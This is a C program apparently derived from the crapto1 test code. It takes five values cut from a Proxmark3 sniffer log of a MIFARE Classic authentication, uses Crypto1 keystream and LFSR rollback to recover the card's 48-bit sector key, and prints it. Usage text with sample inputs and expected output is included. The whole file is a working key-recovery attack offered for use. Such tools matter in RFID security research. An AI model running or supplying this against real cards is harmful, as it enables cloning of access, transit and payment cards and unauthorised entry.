// ported from Test-file: test2.c for crapto1-v2.2
// ver 2: fixed key ordering in output
// ver 3: allow direct cut & paste from sniffer log

#include "crapto1.h"
#include <stdio.h>
#include <string.h>


// Proxmark3 sniffer log
// 
// TAG UID (uid)
// +     64:   0: TAG 5c  72  32  5e  42   
//                    ^^^^^^^^^^^^^^ -> UID
//
// TAG CHALLENGE (tag_challenge)
// +  13542:    :     60  00  f5  7b    
//                        ^^ -> read sector #00
//                         +    112:   0: TAG 50  82  9c  d6    
//                                            ^^^^^^^^^^^^^^ -> tag challenge
//
// READER CHALLENGE (nr_enc)
// +    976:    :     b8  67  1f  76  e0  0e  ef  c9    	!crc
// reader challenge-> ^^^^^^^^^^^^^^
//
// READER RESPONSE (reader_response)
// +    976:    :     b8  67  1f  76  e0  0e  ef  c9    	!crc
//                                    ^^^^^^^^^^^^^^ -> reader resonse
//
// TAG RESPONSE (tag_response)
//  +     64:   0: TAG 48! 88  96  4f    
//                     ^^^^^^^^^^^^^^ -> tag response

int main (int argc, char **argv)
{
 struct Crypto1State *revstate;
 uint64_t lfsr;
 unsigned char* plfsr = (unsigned char*)&lfsr;

 uint32_t uid;
 uint32_t tag_challenge;
 uint32_t nr_enc;
 uint32_t reader_response;
 uint32_t tag_response;
 uint32_t ks2;
 uint32_t ks3;

 int i,j;
 unsigned char newargv[5][11];


//
// hard-wired example
//
// uid= strtoul("0x5c72325e",NULL,16);
// tag_challenge= strtoul("0x50829cd6",NULL,16);
// nr_enc= strtoul("0xb8671f76",NULL,16);
// reader_response= strtoul("0xe00eefc9",NULL,16);
// tag_response= strtoul("0x4888964f",NULL,16);

//
// take values from command line
//
//   ./mifarecrack 0x5c72325e 0x50829cd6 0xb8671f76 0xe00eefc9 0x4888964f
//
 if (argc != 6 && argc != 21)
  {
  printf("\n  usage: mifarecrack <UID> <TAG CHALLENGE> <READER CHALLENGE> <READER RESPONSE> <TAG RESPONSE>\n");
  printf("     or: mifarecrack <CUT & PASTE FROM SNIFFER LOG>\n");
  printf("\n");
  printf("  example: mifarecrack 0x5c72325e 0x50829cd6 0xb8671f76 0xe00eefc9 0x4888964f\n");
  printf("       or: mifarecrack 5c  72  32  5e 50  82  9c  d6 b8  67  1f  76  e0  0e  ef  c9 48! 88  96  4f\n");
  printf("\n");
  printf("  should produce the output:\n");
  printf("\n");
  printf("    uid:  5c72325e\n");
  printf("    nt':  73ba72d6\n");
  printf("    nt'': 93c7b940\n");
  printf("    ks2:  93b49d1f\n");
  printf("    ks3:  db4f2f0f\n");
  printf("\n");
  printf("    Found Key: [ff ff ff ff ff ff]\n");
  printf("\n");
  return -1;
  }

 // concatonate direct pasted sniff elements
 if (argc == 21)
  for (i= 0; i < 5; ++i)
   {
   for (j= 0 ; j < 4 ; ++j)
    memcpy(&newargv[i][j*2],argv[(i*4)+j+1],2);
   newargv[i][8]= '\0';
   }
 else
  for (i= 0; i < 5; ++i)
    memcpy(&newargv[i][0],argv[i+1],11);

 uid= strtoul(newargv[0],NULL,16);
 tag_challenge= strtoul(newargv[1],NULL,16);
 nr_enc= strtoul(newargv[2],NULL,16);
 reader_response= strtoul(newargv[3],NULL,16);
 tag_response= strtoul(newargv[4],NULL,16);

 ks2= reader_response ^ prng_successor(tag_challenge, 64);
 ks3= tag_response ^ prng_successor(tag_challenge, 96);

 printf("\n");
 printf("  uid:  %08x\n",uid);
 printf("  nt':  %08x\n",prng_successor(tag_challenge, 64));
 printf("  nt'': %08x\n",prng_successor(tag_challenge, 96));
 printf("  ks2:  %08x\n",ks2);
 printf("  ks3:  %08x\n",ks3);

 revstate = lfsr_recovery64(ks2, ks3);
#define lfsr_rollback lfsr_rollback_word
 lfsr_rollback(revstate, 0, 0);
 lfsr_rollback(revstate, 0, 0);
 lfsr_rollback(revstate, nr_enc, 1);
 lfsr_rollback(revstate, uid ^ tag_challenge, 0);
 crypto1_get_lfsr(revstate, &lfsr);
 printf("\n  Found Key: [%02x %02x %02x %02x %02x %02x]\n\n",plfsr[5],plfsr[4],plfsr[3],plfsr[2],plfsr[1],plfsr[0]);

 return 0;
}
